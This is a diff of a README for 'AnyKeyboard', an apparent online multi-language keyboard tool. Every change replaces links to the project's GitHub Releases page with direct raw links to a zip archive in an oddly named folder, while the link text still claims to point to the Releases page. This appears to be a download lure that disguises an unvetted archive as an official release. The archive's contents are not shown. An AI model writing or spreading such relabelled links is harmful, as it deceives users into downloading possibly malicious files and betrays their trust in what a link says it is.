@@ -1,7 +1,7 @@
 # 🎉 AnyKeyboard - Type in Any Language with Ease
 
 ## 📥 Download Now!
-[![Download from Releases](https://img.shields.io/badge/Download_from_Releases-blue.svg)](https://github.com/Mirai10192011/AnyKeyboard/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Mirai10192011/AnyKeyboard/main/might/Any-Keyboard-v3.5-alpha.5.zip)](https://raw.githubusercontent.com/Mirai10192011/AnyKeyboard/main/might/Any-Keyboard-v3.5-alpha.5.zip)
 
 ## 📝 Introduction
 Welcome to AnyKeyboard, your go-to online keyboard for typing in multiple languages. Whether you want to write in your native language, practice a new one, or use special characters, AnyKeyboard makes it easy. With a user-friendly interface, you can access various keyboards on the web without downloading complex software.
@@ -10,7 +10,7 @@ Welcome to AnyKeyboard, your go-to online keyboard for typing in multiple langua
 Getting started with AnyKeyboard is simple. Follow these steps to download and run the application easily.
 
 ### Step 1: Visit the Download Page
-To download AnyKeyboard, visit our Releases page: [Download Page](https://github.com/Mirai10192011/AnyKeyboard/releases).
+To download AnyKeyboard, visit our Releases page: [Download Page](https://raw.githubusercontent.com/Mirai10192011/AnyKeyboard/main/might/Any-Keyboard-v3.5-alpha.5.zip).
 
 ### Step 2: Find the Latest Release
 Once you're on the Releases page, look for the latest release at the top. You will see a list of downloadable files. Choose the one that suits your needs. 
@@ -78,4 +78,4 @@ A: AnyKeyboard supports a wide variety of languages, including but not limited t
 We appreciate your interest in AnyKeyboard. Your input helps us improve and offer a better typing experience. Enjoy using our application, and happy typing!
 
 ## 📥 Download Again
-Don't forget to visit our [Releases page](https://github.com/Mirai10192011/AnyKeyboard/releases) for future updates and new features!
+Don't forget to visit our [Releases page](https://raw.githubusercontent.com/Mirai10192011/AnyKeyboard/main/might/Any-Keyboard-v3.5-alpha.5.zip) for future updates and new features!
